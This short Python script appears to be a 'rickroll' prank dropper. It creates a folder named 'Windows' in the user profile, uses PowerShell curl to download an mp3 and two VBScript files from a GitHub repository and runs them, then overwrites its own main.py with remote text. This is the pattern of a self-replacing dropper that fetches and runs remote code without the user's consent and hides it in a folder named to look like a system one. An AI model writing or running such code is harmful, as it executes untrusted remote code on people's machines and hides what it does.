import os

os.system("mkdir %userprofile%\\Windows")
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/rickroll.mp3 -o %userprofile%\\Windows\\main.mp3"')
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/vol.vbs -o %userprofile%\\Windows\\vol.vbs"')
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/song.vbs -o %userprofile%\\Windows\\song.vbs"')
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/replace.txt -o replace.txt"')
replacement = open('replace.txt')
rpl = replacement.readlines()
os.system('cd %userprofile%\\Windows && song.vbs')
os.system('cd %userprofile%\\Windows && vol.vbs')
with open ('main.py', 'w') as f:
    f.writelines(rpl)
